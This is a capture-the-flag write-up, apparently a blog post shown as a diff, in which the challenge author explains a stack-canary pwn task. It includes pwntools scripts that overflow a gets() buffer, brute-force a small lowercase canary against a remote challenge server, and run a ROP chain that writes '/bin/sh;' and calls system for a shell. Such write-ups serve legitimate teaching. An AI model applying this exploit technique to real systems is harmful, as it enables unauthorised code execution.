@@ -1,0 +1,92 @@
+I"<p>I am so proud of my team (zh3r0). This was our first CTF and it went pretty well.</p>
+
+<h2 id="challenge-description">Challenge description:</h2>
+<p><img src="/assets/images/imcanary.png" alt="" /></p>
+
+<h2 id="solution">Solution:</h2>
+<h3 id="first-step">First step:</h3>
+
+<p>Analyze the binary and then check its mitigations.</p>
+
+<p><img src="/assets/images/mitigationscanary.png" alt="" /></p>
+
+<ul>
+  <li>NX is enabled so no shellcodes.</li>
+  <li>PIE is disabled and also ASLR was disabled so no worries of the address changing.
+Now, let us run the binary and then see !!</li>
+</ul>
+
+<p><img src="/assets/images/run.png" alt="" /></p>
+
+<p>We can say that there was a continuous loop running. Also if we analyze the binary carefully we can see the <code class="language-plaintext highlighter-rouge">name</code> and <code class="language-plaintext highlighter-rouge">input</code> were not vulnerable but the <code class="language-plaintext highlighter-rouge">description</code> was using gets which reads arbitrary input.Now we can disassemble the main file now.</p>
+
+<p><img src="/assets/images/get.png" alt="" /></p>
+
+<ul>
+  <li>GETS is vulnerable but…</li>
+  <li>There is an additional memory compare.</li>
+  <li>We can say that it might be our canary.</li>
+</ul>
+
+<h3 id="the-idea-for-the-exploit">The idea for the exploit:</h3>
+<p>Our first step will be in calculating the offset for the canary. I use pwntools pwn cyclic function but you guys can do anything.</p>
+
+<h3 id="inside-gdb">Inside GDB:</h3>
+<ul>
+  <li>I set a break at the memory compare.</li>
+  <li>I use pwntools to analyze what is being compared with what</li>
+  <li>Note: I also set up a fake canary to work with the binary locally</li>
+</ul>
+
+<p><img src="/assets/images/break.png" alt="" />
+<br />
+<img src="/assets/images/break2.png" alt="" /></p>
+
+<p>Then I analyzed the string that was being compared with the help of pwntools.<br />
+I got the offset as 192 for the canary. Now let me make a script to get a shell.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="s">'''
+system address = 0x400780
+'''</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"134.209.157.250"</span><span class="p">,</span> <span class="mi">5084</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="s">'a'</span><span class="o">*</span><span class="mi">192</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="p">(</span><span class="s">'abcd'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>So I set the canary to be “abcd” and then I searched for some ROP and before that, I also got the offset for the ret to be 20 bytes.
+So I created a <strong>ROP chain.</strong></p>
+
+<p><img src="/assets/images/c1.png" alt="" />
+now it’s just combining all of the gadgets that’s it.</p>
+<h3 id="final-step">Final step:</h3>
+<p>I need to brute force the canary. It was damn easy cause i told them the hints that the canary was going to be small letters and was going to be in order.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="s">'''
+sys = 0x400780
+'''</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span> <span class="mi">123</span><span class="p">):</span>
+ <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"134.209.157.250"</span><span class="p">,</span><span class="mi">5084</span><span class="p">)</span>
+ <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+ <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+ <span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="s">'a'</span><span class="o">*</span><span class="mi">192</span><span class="p">)</span>
+ <span class="n">buf</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span>
+ <span class="n">buf</span> <span class="o">+=</span> <span class="p">(</span><span class="s">'a'</span><span class="o">*</span><span class="mi">20</span><span class="p">)</span>
+ <span class="n">buf</span> <span class="o">+=</span> <span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400936</span><span class="p">))</span> <span class="c1"># pop r12
+</span> <span class="n">buf</span> <span class="o">+=</span> <span class="p">(</span><span class="s">"/bin/sh;"</span><span class="p">)</span>
+ <span class="n">buf</span> <span class="o">+=</span> <span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400933</span><span class="p">))</span> <span class="c1">#  pop r11 
+</span> <span class="n">buf</span> <span class="o">+=</span> <span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6020B0</span><span class="p">))</span> <span class="c1">#  just a random address to write to 
+</span> <span class="n">buf</span> <span class="o">+=</span> <span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400927</span><span class="p">))</span> <span class="c1">#  mov [r11], r12
+</span> <span class="n">buf</span> <span class="o">+=</span> <span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400939</span><span class="p">))</span> <span class="c1"># pop rdi
+</span> <span class="n">buf</span> <span class="o">+=</span> <span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6020B0</span><span class="p">))</span> <span class="c1">#  write address
+</span> <span class="n">buf</span> <span class="o">+=</span> <span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400780</span><span class="p">))</span> <span class="c1">#  system
+</span> <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+ <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p>I just made the loop a bit big but what is the problem :P
+<img src="/assets/images/shell.png" alt="" /></p>
+
+<h2 id="end">END</h2>
+<p>This was my first attempt to make a canary problem.So hope you liked this. Will be posting more blogs soon.</p>
+:ET
